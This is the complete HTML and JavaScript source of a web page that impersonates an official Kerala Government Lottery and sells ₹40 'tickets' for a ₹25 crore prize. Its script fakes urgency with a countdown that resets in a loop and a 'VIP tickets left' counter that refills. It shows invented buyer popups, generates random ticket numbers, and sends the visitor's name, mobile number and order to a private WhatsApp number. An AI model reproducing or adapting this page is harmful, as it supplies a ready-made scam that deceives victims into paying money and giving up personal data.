<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kerala Government Lottery</title>

<style>

body{
margin:0;
background:linear-gradient(135deg,#fff0f5,#ffe6f0);
font-family:Arial;
display:flex;
justify-content:center;
padding:10px;
}

.container{
width:100%;
max-width:400px;
background:#fff;
padding:16px;
border-radius:16px;
box-shadow:0 8px 20px rgba(0,0,0,.15);
}

.heroBox{
background:linear-gradient(135deg,#ff4f79,#ff758c);
color:#fff;
padding:14px;
border-radius:12px;
text-align:center;
margin-bottom:10px;
}

.urgencyBox{
background:#fff3cd;
border:1px solid #ffeeba;
padding:8px;
border-radius:8px;
text-align:center;
font-size:13px;
font-weight:bold;
margin-bottom:10px;
}

input,select{
width:100%;
padding:10px;
margin-bottom:8px;
border-radius:8px;
border:1px solid #ddd;
font-size:13px;
}

.ticketBox{
border:2px dashed #ff4f79;
border-radius:12px;
padding:10px;
background:#fff7fa;
}

.ticketAmount{
background:#e8f5e9;
color:#1b5e20;
padding:6px;
border-radius:8px;
text-align:center;
font-weight:bold;
margin-bottom:6px;
}

.tag{
display:inline-block;
padding:6px 10px;
border-radius:20px;
margin:4px;
font-size:12px;
background:#ffd6e0;
color:#c2185b;
}

.submitBtn{
width:100%;
background:linear-gradient(90deg,#00c853,#009624);
color:#fff;
border:none;
font-weight:bold;
cursor:pointer;
font-size:16px;
padding:14px;
border-radius:12px;
}

#popup{
position:fixed;
top:15px;
left:20px;
right:20px;
background:#fff;
border-radius:12px;
padding:12px;
box-shadow:0 5px 20px rgba(0,0,0,.25);
display:none;
z-index:9999;
border-left:4px solid #00c853;
}

</style>
</head>

<body>

<div class="container">

<div class="heroBox">

<div style="font-size:34px;">🏆</div>

<h2 style="margin:5px 0;font-size:22px;letter-spacing:1px;">
KERALA GOVERNMENT LOTTERY
</h2>

<div style="
display:inline-block;
background:#fff;
color:#ff4f79;
padding:4px 12px;
border-radius:20px;
font-size:12px;
font-weight:bold;
margin-bottom:6px;
">
OFFICIAL JACKPOT DRAW
</div>

<p style="margin-top:4px;font-size:14px;">
Book Your Ticket Now • First Prize ₹25 Crore
</p>

</div>

<div class="urgencyBox">
⏳ Offer closing in <span id="timer">11:59</span><br>
🔥 Only <span id="leftTickets">78</span> VIP Tickets Left
</div>

<input id="name" placeholder="Full Name">
<input id="mobile" placeholder="Mobile Number" maxlength="10">

<div class="ticketBox">

<div class="ticketAmount" id="ticketAmount">
🎟 Select Tickets (₹40 each)
</div>

<select id="ticket" multiple></select>

</div>

<div id="selectedTickets"></div>

<input id="amount" placeholder="Total Amount (₹)" readonly>

<button id="submitBtn" class="submitBtn">
📲 Submit & Continue To WhatsApp
</button>

</div>

<div id="popup"></div>

<script>

const PRICE=40;

const ticket=document.getElementById("ticket");
const amount=document.getElementById("amount");
const ticketAmount=document.getElementById("ticketAmount");
const submitBtn=document.getElementById("submitBtn");
const nameI=document.getElementById("name");
const mobileI=document.getElementById("mobile");
const selectedDiv=document.getElementById("selectedTickets");

for(let i=0;i<2000;i++){

let n=("000000"+Math.floor(Math.random()*999999)).slice(-6);

let o=document.createElement("option");

o.value="KL"+n;
o.textContent="KL"+n;

ticket.appendChild(o);

}

function refresh(){

let sel=[...ticket.selectedOptions];

selectedDiv.innerHTML="";

let total=sel.length*PRICE;

if(sel.length>0){

amount.value="₹ "+total;

ticketAmount.textContent="Tickets: "+sel.length+" | Amount: ₹ "+total;

}else{

amount.value="";

ticketAmount.textContent="Select Tickets (₹40 each)";

}

sel.forEach(o=>{

let tag=document.createElement("div");

tag.className="tag";

tag.innerHTML="🎟 "+o.value;

selectedDiv.appendChild(tag);

});

}

ticket.addEventListener("change",refresh);

mobileI.addEventListener("input",function(){

mobileI.value=mobileI.value.replace(/[^0-9]/g,'').slice(0,10);

});

submitBtn.addEventListener("click",function(){

let name=nameI.value.trim();

let mobile=mobileI.value.trim();

let sel=[...ticket.selectedOptions];

if(name==""){

alert("Enter your name");

return;

}

if(mobile.length!=10){

alert("Enter valid mobile");

return;

}

if(sel.length<2){

alert("Minimum 2 tickets");

return;

}

let total=sel.length*PRICE;

let list=sel.map(o=>o.value).join(", ");

let msg=` New Booking

Name: ${name}
Mobile: ${mobile}

Tickets (${sel.length})
${list}

Total Amount ₹${total}

Please confirm booking`;

setTimeout(()=>{

window.open("https://wa.me/+916003705797?text="+encodeURIComponent(msg),"_blank");

},200);

});

let min=11;
let sec=59;

setInterval(()=>{

sec--;

if(sec<0){

sec=59;
min--;

}

if(min<0){

min=11;
sec=59;

}

document.getElementById("timer").textContent=
(min<10?"0"+min:min)+":"+(sec<10?"0"+sec:sec);

},1000);

let vip=78;

setInterval(()=>{

vip=vip-Math.floor(Math.random()*2);

if(vip<10){

vip=78;

}

document.getElementById("leftTickets").textContent=vip;

},5000);

const names=["Ramesh","Suresh","Anitha","Pooja","Krishna","Divya","Lakshmi"];
const cities=["Bangalore","Chennai","Hyderabad","Kochi","Mysuru"];

function popup(){

let name=names[Math.floor(Math.random()*names.length)];

let city=cities[Math.floor(Math.random()*cities.length)];

let tickets=Math.floor(Math.random()*10)+2;

let total=tickets*40;

let box=document.getElementById("popup");

box.innerHTML=`<b>${name}</b> from <b>${city}</b><br>
🎟 ${tickets} Tickets booked<br>
₹${total} Paid`;

box.style.display="block";

setTimeout(()=>{

box.style.display="none";

},2500);

}

setInterval(popup,4000);

</script>

</body>
</html>
